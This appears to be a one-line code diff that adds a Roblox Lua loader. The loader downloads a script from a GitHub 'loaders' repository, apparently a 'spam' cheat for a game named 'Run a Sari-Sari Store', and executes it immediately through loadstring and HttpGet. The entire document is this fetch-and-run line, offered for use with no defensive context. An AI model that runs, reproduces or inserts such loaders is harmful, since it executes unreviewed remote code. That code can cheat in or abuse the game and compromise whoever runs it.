@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/run-a-sari-sari-store-spam3-5yu29a9mgu3xjx.lua"))()
